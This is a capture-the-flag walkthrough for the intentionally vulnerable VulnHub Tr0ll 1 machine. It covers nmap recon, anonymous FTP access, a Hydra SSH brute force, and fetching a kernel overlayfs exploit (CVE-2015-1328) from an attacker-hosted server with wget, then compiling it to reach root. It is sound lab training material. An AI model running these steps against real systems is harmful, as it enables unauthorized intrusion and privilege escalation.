# 😇😇 **###### DISCLAIMER ######** _Spoilers below!_ 😇😇
# VulnHub Machine Tr0ll 1 — Walkthrough
[@GangGreenTemperTatum](https://github.com/GangGreenTemperTatum), v1.0, 02-02-2023

![1_QgTFkxQlUt6G5s2hO5dZcQ](https://user-images.githubusercontent.com/104169244/216751524-41dbd958-9638-4fd5-aea1-33c299ca1c63.png)

## Additional Resources:
- Download the [**Offensive Security**'s Penetration Test Sample Report](https://www.offensive-security.com/pwk-online/PWKv1-Report.docx) in `.docx` format for you to edit.

## Setup Instructions:
* Download the intentionally vulnerable Tr0ll VM in `.tar` format from [vulhub.com](https://www.vulnhub.com/entry/tr0ll-1,100/)
* To create the VM in VMWare:
  * Use brew to install rar `$ brew install rar` and allow permissions in MAC OS Security Settings
  * Navigate to the downloads location and extract the file with unrar - `$ unrar x Tr0ll.rar` 
  * Double-click the `.vmx` (`Tr0ll.vmx`) file within the extracted directory which will open the file natively with VMWare Fusion
  * Follow any prompts to upgrade and select **"I moved it"**, when prompted
  * The virtual machine will start from there

> I'd love to make this testing simpler by converting the Tr0ll VM file to a *trusted-"Virtualbox compatible"* `.vbox` format or preferred as a **Docker container** which you can then run directly from Kali hardware and allows for easier cross-compatibility, instead of having to work out of multiple machines

* Download the [Kali Linux VM](https://www.kali.org/get-kali/#kali-virtual-machines) file compatible for VMWare Fusion (in my scenario)
  * Extract the file with MAC OS native `$ unzip` and double-click the enclosed single `.vbox` file, following the prompts with **(Y)**.

* The defaults of both VM's should get your wheels spinning, at least enough in terms of network connectivity by bridging the network of your host where the hypervisor resides

# Reconnaisance:

* Identify the IPv4 address of your newly provisioned Tr0ll VM using NMAP network range discovery in a ping sweep fashion:
  * Hint, you can also use your hypervisor advanced network settings to see the underlying MAC address, or generate a new one if you are really stuck

```
$ sudo nmap -n -vv -sn <ipv4network/cidr> -oG - | grep -i 'up'
```

![Screenshot 2023-02-03 at 13 16 34](https://user-images.githubusercontent.com/104169244/216751533-3ad7c0d7-6867-4cf7-8c27-e261f10c9caa.png)

* Ensure there is network connectivity between your host machine (being the default-gateway for the default `/24` VMWare bridge network), Kali Linux VM and Tr0ll VM
  * Note, during your testing ICMP may fail which may could be due to the scope of the test (iptables etc.)
  * `tcpdump` is your friend here, try changing your payload & protocol approaches within scanning
  * Another alternate tooling option could be `arp-scan`

```
$ ifconfig | grep bridge -B 5
$ ip address show
$ ping <ipv4>
```

* Recon the server and underlying application, ports and protocols using `nmap`:

```
$ sudo su
$ nmap -sC -sV -A <ipaddr>
$ sudo arp-scan -l
$ sudo arp-scan -I eth0 --srcaddr=DE:AD:BE:EF:CA:FE <ipv4network/cidr>
$ sudo netdiscover -i eth0 -r  <ipv4network/cidr>
```

![Screenshot 2023-02-03 at 12 41 46](https://user-images.githubusercontent.com/104169244/216751544-f1aabb86-9c1c-41bb-b05e-0365886c4a52.png)
![Screenshot 2023-02-03 at 13 12 38](https://user-images.githubusercontent.com/104169244/216751547-3735c48e-426c-49c7-a3d8-e122460c22b1.png)
![Screenshot 2023-02-03 at 13 14 37](https://user-images.githubusercontent.com/104169244/216751549-80946de0-f1b6-4bc4-b8e4-e063036c66b0.png)

![Screenshot 2023-02-03 at 13 20 33](https://user-images.githubusercontent.com/104169244/216751592-d68570ab-3d29-4f30-87ff-711e4b52f2ec.png)

* Exploit the FTP Anonymous Login vulnerability:

```
$ ftp <remoteipaddr> 
# User = "anonymous"
# Password = "blank"
```

![Screenshot 2023-02-03 at 13 47 22](https://user-images.githubusercontent.com/104169244/216751604-4ba722f9-9252-4147-9448-f5df25d497e1.png)
![Screenshot 2023-02-03 at 13 50 12](https://user-images.githubusercontent.com/104169244/216751654-bb95f725-e36d-4026-b5ca-f4417360f325.png)

* Analyzing the PCAP file (we realize this is a tripwire) in Wireshark and delving into the packet payload content also displays other hidden files and easter eggs, including a message:

🦈 (I love this feature of Wireshark that allows you to copy the columns as text when making notes to remember or highlight specific frames)

```
24	9.816122	10.0.0.6	10.0.0.12	FTP-DATA	140	FTP Data: 74 bytes (PORT) (LIST)
39	17.799735	10.0.0.6	10.0.0.12	FTP	141	Response: 150 Opening BINARY mode data connection for secret_stuff.txt (147 bytes).
40	17.799796	10.0.0.6	10.0.0.12	FTP-DATA	213	FTP Data: 147 bytes (PORT) (RETR secret_stuff.txt)
```

![Screenshot 2023-02-03 at 13 57 37](https://user-images.githubusercontent.com/104169244/216751871-3ff9728d-6c0d-4c06-9858-d79eb52af3cd.png)
![Screenshot 2023-02-03 at 13 54 23](https://user-images.githubusercontent.com/104169244/216751619-fc331b1c-6846-472f-8a3a-1f5c86b9788d.png)
![Screenshot 2023-02-03 at 13 56 53](https://user-images.githubusercontent.com/104169244/216752256-fcdecbeb-1560-4333-8c72-549d04490dea.png)

![Screenshot 2023-02-03 at 13 56 11](https://user-images.githubusercontent.com/104169244/216751893-f5884889-2f57-495e-b8a3-e1f4baedb450.png)

* From analysis of the former methodology and testing, I was able to pivot from the FTP anonymous login vulnerability and locate the tr0ll directory in the web application:

```
$ curl --GET <remoteipaddr>/
$ curl --GET <remoteipaddr> <tr0lldir>
```

![Screenshot 2023-02-03 at 14 05 09](https://user-images.githubusercontent.com/104169244/216751875-9670ae7c-9b19-4384-8968-90eb89729b93.png)
![Screenshot 2023-02-03 at 14 54 26](https://user-images.githubusercontent.com/104169244/216751881-01d4efed-a0ed-4c4f-a2d6-a10924b074fa.png)

* Dive in with a web-browser to investigate further, another file of interest is found:
  * It is not readable in a .txt file format and has no file extension:

![Screenshot 2023-02-03 at 14 07 13](https://user-images.githubusercontent.com/104169244/216751906-dc13d688-4342-4909-a0f4-85bd1a80e783.png)

```
$ cat /home/kali/Downloads/<tr0llfile>
```

* Utilizing `file`, we identified it is indeed an LSB ("least significant byte") executable and as such performed a static analysis of the file using `strings`:

```
$ file /home/kali/Downloads/<tr0llfile>
$ strings /home/kali/Downloads/<tr0llfile>

# "Find address 0xREDACTED to proceed"
```

* This find gives us the correct directory and hidden files (of which one is another tr0ll)
  * From analysis of the former methodology and testing, I was able to pivot from the abuse of the web application and hidden sensitive files to perform a brute force attack using one of the useful files containing usernames and|or passwords.
  * We know SSH is open from our initial recon and network scanning using `nmap` service enumeration

![Screenshot 2023-02-03 at 14 14 10](https://user-images.githubusercontent.com/104169244/216751912-c6fcee25-6de0-441c-9d00-bff3de590fe3.png)

* Save the one "good" file from the unearthed directory, removing the benign username and also create a "passwords" text file containing string "Pass.txt"
* Use `Hydra` to brute-force the SSH service with these files:

```
$ hydra -L /home/kali/Downloads/usernames.txt -P /home/kali/Downloads/pass.txt <remoteipaddr> ssh
```

![Screenshot 2023-02-03 at 14 32 31](https://user-images.githubusercontent.com/104169244/216751954-40f2ba8f-d598-40b9-a257-685dfd51337a.png)

* The output from `Hydra` successfully displays login credentials which can be used for SSH authorization to the remote server:

```
$ ssh <username>@<remoteipaddr>:22
```

* From analysis of the former methodology and testing, we have now successfully authenticate with valid credentials via SSH to the server, but then identified it did not have sudo permissions and came across another tripwire tr0ll:

![Screenshot 2023-02-03 at 14 40 25](https://user-images.githubusercontent.com/104169244/216751964-34558110-3ed8-4f7a-8b94-0085f32866c2.png)

* Use `$ lsb_release -a` to identify the operating-system of the underlying server:

```
$ lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.1 LTS
Release:        14.04
Codename:       trusty
```

* Which we then again, pivoted and used a common vulnerability database [`Searchsploit`](https://www.exploit-db.com/searchsploit) to hunt for exploits relating to this operating system and version:

```
$ searchsploit 14.04
$ searchsploit linux/local/37292.c
```

![Screenshot 2023-02-03 at 14 45 45](https://user-images.githubusercontent.com/104169244/216752006-7ac392e6-b27e-4b33-a730-fcee26531565.png)

```
└─# searchsploit 14.04       
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
..
Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalatio | linux/local/37292.c
..
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

└─# searchsploit -p 37292           
  Exploit: Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/37292
     Path: /usr/share/exploitdb/exploits/linux/local/37292.c
    Codes: CVE-2015-1328
 Verified: True
File Type: C source, ASCII text, with very long lines (466)
```

![Screenshot 2023-02-03 at 15 13 15](https://user-images.githubusercontent.com/104169244/216752015-d75138cf-cfea-43a2-9284-26cfaa68b18e.png)

* We pull and host the exploit from Searchsploit on Kali first
* We download the applicable exploit on the remote host using `wget`
    * We use the attacking VM (Kali Linux) to host the exploit file using `python3 http.server` module (OR )`python SimpleHTTPServer`)
  * We then compile the exploit using `gcc compiler` and then executing it to escalate privileges:

```
$ ls -halt /usr/share/exploitdb/exploits/linux/local/37292.c
$ cp /usr/share/exploitdb/exploits/linux/local/37292.c /home/kali/Desktop/37292.c

$ which python3
# usr/bin/python -m SimpleHTTPServer 8080
# OR
$ usr/bin/python3 -m http.server 8080
```

* Use `$ which python(3)` (depending which version you want to use) to identify the `PATH` to execute.
* Python3 module = `http.server`
* Python<3 module = `SimpleHTTPServer`

![Screenshot 2023-02-03 at 15 22 14](https://user-images.githubusercontent.com/104169244/216752028-f3855356-8e07-4bfc-b244-05d626bf9bae.png)

```
$ cd /tmp
$ wget http://<kali-vm-ipaddr>:<http-port>/Desktop/37292.c
```

* We need to write to the `/tmp` directory as we come across permission failures to directly write to `./`.

![Screenshot 2023-02-03 at 15 21 23](https://user-images.githubusercontent.com/104169244/216752039-9b93fed6-8397-4d19-bfa0-6405a3066d9c.png)

* From analysis of the former methodology and testing, we can then gain Root access to the system from the prior privilege escalation vulnerability:

```
$ gcc -o tro 37292.c
$ whoami
overflow
$ id
uid=1002(overflow) gid=1002(overflow) groups=1002(overflow)
$ ./tro 
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
# whoami
root
```

![Screenshot 2023-02-03 at 15 26 08](https://user-images.githubusercontent.com/104169244/216752067-22858742-dfa2-4a32-a904-1ba72c52b884.png)

* From analysis of the former methodology and testing, I was able to pivot to the `/root/` directory which contained the CTF flag:

```
# cd ..
# ls
bin   dev  home        lib         media  opt   root  sbin  sys  usr  vmlinuz
boot  etc  initrd.img  lost+found  mnt    proc  run   srv   tmp  var
# cd root
# ls -halt
total 28K
drwx------  3 root root 4.0K Aug 13  2014 .
-rw-------  1 root root    0 Aug 13  2014 .bash_history
-rw-------  1 root root 5.5K Aug 13  2014 .viminfo
drwx------  2 root root 4.0K Aug 10  2014 .ssh
-rw-r--r--  1 root root   58 Aug 10  2014 proof.txt
-rw-r--r--  1 root root   74 Aug 10  2014 .selected_editor
drwxr-xr-x 21 root root 4.0K Aug  9  2014 ..
# 
# cat proof.txt 
Good job, you did it! 


702a8c18d29c6f3ca0d99ef5712bfbdc
# 
```

![Screenshot 2023-02-03 at 15 27 16](https://user-images.githubusercontent.com/104169244/216752075-a311ae84-a3b7-4bab-8ae1-0439f49606ea.png)


### Additional Items Not Mentioned in the Report

* This section is placed for any additional items that were not mentioned in the overall report.

  - Maintaining/persisting access
  - Lateral movement (not applicable as sandboxed environment)
  - Individual remediation items per-finding/exploit
  - Web-server vulnerabilities (Nikto|SAST|DAST etc.)
  - Any other identified open socket protocols or port vulnerability techniques

The report (as this an emulated lab and sandboxed environment) does not include credentials or IP addresses in redacted or obfuscated format.
